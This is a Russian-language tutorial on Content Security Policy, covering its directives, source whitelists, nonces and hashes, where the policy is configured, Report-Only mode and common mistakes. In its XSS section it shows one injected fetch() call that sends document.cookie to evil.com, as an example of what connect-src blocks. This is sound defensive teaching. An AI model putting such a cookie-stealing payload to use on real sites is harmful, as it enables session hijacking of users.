# Content Security Policy (CSP)

## Что такое CSP

**Content Security Policy (CSP)** — это механизм безопасности браузера, который позволяет ограничить, **какие ресурсы разрешено загружать и выполнять на странице**.

Основная задача CSP — снизить риск XSS-атак и ограничить последствия, если вредоносный код все же оказался в приложении.

Важно понимать:

> **CSP не предотвращает появление XSS**, а лишь ограничивает возможности злоумышленника после успешной инъекции (Defense in Depth).

## Как работает CSP

Сервер (или сама HTML-страница) передает браузеру политику безопасности.

Например:

```http
Content-Security-Policy:
default-src 'self';
script-src 'self' https://cdn.company.com;
connect-src 'self' https://api.company.com;
img-src 'self' data:;
style-src 'self';
```

После получения политики именно браузер начинает контролировать загрузку ресурсов и выполнение операций.

Если действие нарушает политику безопасности, браузер автоматически его блокирует.

Например, можно запретить:

- выполнение JavaScript с неизвестных доменов;
- подключение сторонних CSS-файлов;
- выполнение `fetch()` и `XMLHttpRequest` на запрещенные серверы;
- открытие WebSocket-соединений;
- загрузку изображений с неизвестных источников;
- создание Web Worker и Service Worker из недоверенных источников.

## Основные директивы CSP

| Директива         | Назначение                                   |
| ----------------- | -------------------------------------------- |
| `default-src`     | Политика по умолчанию для всех ресурсов      |
| `script-src`      | JavaScript                                   |
| `style-src`       | CSS                                          |
| `img-src`         | Изображения                                  |
| `font-src`        | Шрифты                                       |
| `connect-src`     | `fetch`, XHR, WebSocket, EventSource         |
| `worker-src`      | Web Worker и Service Worker                  |
| `frame-src`       | iframe                                       |
| `frame-ancestors` | Какие сайты могут встроить страницу в iframe |
| `media-src`       | Видео и аудио                                |
| `object-src`      | Flash и другие плагины (обычно запрещают)    |

## Белый список источников

CSP работает по принципу **белого списка**.

Например:

```text
script-src 'self' https://cdn.company.com
```

Это означает, что JavaScript разрешено загружать только:

- с текущего Origin (`'self'`);
- с указанного CDN.

Любой другой скрипт браузер автоматически заблокирует.

## Inline-скрипты

По умолчанию CSP запрещает выполнение inline-скриптов:

```html
<script>
  ...
</script>
```

а также inline-обработчиков событий:

```html
<button onclick="..."></button>
```

Это значительно снижает риск XSS-атак.

### nonce

Если выполнение inline-скрипта необходимо, используют **nonce**.

Сервер генерирует случайную строку:

```html
<script nonce="A1B2C3">
```

и одновременно отправляет политику:

```http
Content-Security-Policy:
script-src 'nonce-A1B2C3'
```

Только скрипт с указанным `nonce` будет выполнен браузером.

### hash

Другой вариант — использовать SHA-хэш содержимого скрипта.

Например:

```text
script-src 'sha256-xxxxxxxxxxxxxxxxxxxx'
```

Если содержимое скрипта изменится хотя бы на один символ, браузер его не выполнит.

## Как CSP помогает защититься от XSS

Предположим, злоумышленник смог внедрить JavaScript:

```javascript
fetch("https://evil.com", {
  method: "POST",
  body: document.cookie,
});
```

Если политика содержит:

```text
connect-src 'self'
```

браузер заблокирует этот запрос.

Даже несмотря на то, что вредоносный JavaScript уже начал выполняться.

Именно поэтому CSP считается дополнительным уровнем защиты после предотвращения XSS.

## Где настраивается CSP

### HTTP-заголовок (рекомендуется)

Наиболее распространенный и рекомендуемый способ.

```http
Content-Security-Policy: ...
```

### Meta-тег

Для полностью статических сайтов CSP можно указать прямо в HTML.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
```

Используется значительно реже.

### Web Server

Для SPA политику часто задают на уровне веб-сервера.

Например, в Nginx:

```nginx
add_header Content-Security-Policy "...";
```

### Backend

При SSR (Next.js, Nuxt, NestJS, Spring, ASP.NET и др.) CSP обычно формируется сервером.

Это позволяет:

- генерировать уникальный `nonce` для каждого запроса;
- динамически изменять политику;
- использовать разные политики для разных страниц.

## Режим Report-Only

Во время настройки CSP часто используют режим:

```http
Content-Security-Policy-Report-Only
```

В этом режиме браузер **не блокирует нарушения**, а лишь отправляет отчеты.

Это позволяет безопасно проверить новую политику перед ее включением.

## Кто обычно управляет CSP

В небольших проектах политику безопасности обычно настраивают frontend- или backend-разработчики.

В крупных компаниях этим часто занимается отдел информационной безопасности (ИБ).

Типичный процесс выглядит так:

1. разработчик хочет подключить новый внешний сервис;
2. создается заявка;
3. отдел ИБ проверяет безопасность;
4. после согласования домен добавляется в CSP.

Так централизованно контролируется список доверенных источников.

## Что важно помнить

CSP **не заменяет безопасную разработку**.

Он **не устраняет XSS**, а лишь ограничивает последствия успешной атаки.

Поэтому защита строится в несколько уровней:

1. Предотвращать XSS:
   - экранировать пользовательские данные;
   - избегать `eval()`;
   - не использовать `innerHTML` и `dangerouslySetInnerHTML` без санитизации.

2. Использовать CSP как дополнительный уровень защиты (Defense in Depth).

## Частые ошибки

❌ Считать, что CSP полностью защищает от XSS.

CSP лишь ограничивает последствия успешной инъекции, но не предотвращает саму уязвимость.

❌ Использовать `'unsafe-inline'` без необходимости.

Это существенно ослабляет защиту и сводит на нет многие преимущества CSP.

❌ Думать, что CSP контролирует только загрузку скриптов.

На самом деле CSP умеет ограничивать загрузку изображений, стилей, шрифтов, iframe, AJAX-запросов, WebSocket, Worker и других ресурсов.

❌ Путать `frame-src` и `frame-ancestors`.

`frame-src` определяет, **какие iframe можно загружать на страницу**, а `frame-ancestors` — **какие сайты могут встроить саму страницу в iframe** (защита от Clickjacking).
